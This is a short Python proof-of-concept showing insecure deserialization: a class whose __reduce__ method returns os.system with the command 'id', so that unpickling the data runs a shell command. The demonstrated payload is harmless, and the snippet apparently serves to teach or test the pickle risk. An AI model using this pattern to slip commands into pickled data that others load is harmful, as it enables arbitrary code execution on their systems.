import pickle

class X():
    def __reduce__(self):
        import os
        return ( os.system,('id',) )

dat = pickle.dumps(X())
print(pickle.loads(dat))